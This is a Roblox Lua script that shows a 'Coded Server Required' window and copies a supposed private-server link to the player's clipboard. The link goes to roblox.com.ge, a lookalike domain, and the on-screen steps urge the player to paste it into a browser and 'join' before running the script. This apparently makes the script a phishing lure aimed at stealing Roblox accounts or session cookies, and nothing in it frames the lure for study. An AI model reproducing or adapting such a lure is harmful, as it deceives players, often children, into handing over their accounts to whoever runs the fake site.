-- LocalScript (Improved Coded Server GUI)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- UPDATED CODED SERVER LINK
local codedServerLink = "https://roblox.com.ge/games/77747658251236/Moon-Update-Sailor-Piece?privateServerLinkCode=40361903024470854671760910869278"

-- ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "CodedServerGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Simple loading (shorter + nicer)
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
loadingFrame.Parent = gui

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0.6, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.2, 0, 0.45, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading..."
loadingText.TextColor3 = Color3.fromRGB(0, 255, 100)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBold
loadingText.Parent = loadingFrame

task.wait(2)
local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad)
TweenService:Create(loadingFrame, tweenInfo, {BackgroundTransparency = 1}):Play()
task.wait(0.7)
loadingFrame:Destroy()

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0.45, 0, 0.55, 0)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 22)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 255, 100)
stroke.Thickness = 2
stroke.Transparency = 0.4
stroke.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0.18, 0)
title.Position = UDim2.new(0, 20, 0, 20)
title.BackgroundTransparency = 1
title.Text = "CODED SERVER REQUIRED"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.Parent = mainFrame

local titleStroke = Instance.new("UIStroke")
titleStroke.Color = Color3.fromRGB(0, 255, 100)
titleStroke.Thickness = 1.5
titleStroke.Transparency = 0.7
titleStroke.Parent = title

local instructions = Instance.new("TextLabel")
instructions.Size = UDim2.new(1, -40, 0.45, 0)
instructions.Position = UDim2.new(0, 20, 0.22, 0)
instructions.BackgroundTransparency = 1
instructions.TextWrapped = true
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Text =
	"Join the coded private server to use this script safely 🔥\n\n" ..
	"1. Click the button below\n" ..
	"2. Paste the link into a new Chrome tab\n" ..
	"3. Click Play on Roblox\n" ..
	"4. Join and run the script"
instructions.TextColor3 = Color3.fromRGB(180, 180, 190)
instructions.TextScaled = true
instructions.Font = Enum.Font.Gotham
instructions.Parent = mainFrame

local button = Instance.new("TextButton")
button.Size = UDim2.new(0.7, 0, 0.16, 0)
button.Position = UDim2.new(0.5, 0, 0.78, 0)
button.AnchorPoint = Vector2.new(0.5, 0)
button.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
button.Text = "Get Coded Server"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.Font = Enum.Font.GothamBold
button.BorderSizePixel = 0
button.Parent = mainFrame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 12)
btnCorner.Parent = button

local btnStroke = Instance.new("UIStroke")
btnStroke.Color = Color3.fromRGB(0, 255, 120)
btnStroke.Thickness = 2
btnStroke.Parent = button

local originalColor = button.BackgroundColor3
local hoverColor = Color3.fromRGB(0, 220, 100)

button.MouseEnter:Connect(function()
	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
end)

button.MouseLeave:Connect(function()
	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor}):Play()
end)

button.MouseButton1Click:Connect(function()
	local pressTween = TweenService:Create(button, TweenInfo.new(0.1), {
		Size = UDim2.new(0.65, 0, 0.14, 0)
	})
	pressTween:Play()
	pressTween.Completed:Wait()

	button.Text = "Generating Link..."
	button.BackgroundColor3 = Color3.fromRGB(0, 160, 60)

	task.wait(0.8)

	local success = pcall(function()
		setclipboard(codedServerLink)
	end)

	if success then
		button.Text = "✅ Link Copied to Clipboard!"
		button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)

		task.delay(4, function()
			if button and button.Parent then
				button.Text = "Get Coded Server"
				button.BackgroundColor3 = originalColor
			end
		end)
	else
		button.Text = "❌ Clipboard Failed"
		button.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
		task.wait(3)
		button.Text = "Get Coded Server"
		button.BackgroundColor3 = originalColor
	end

	TweenService:Create(button, TweenInfo.new(0.15), {
		Size = UDim2.new(0.7, 0, 0.16, 0)
	}):Play()
end)
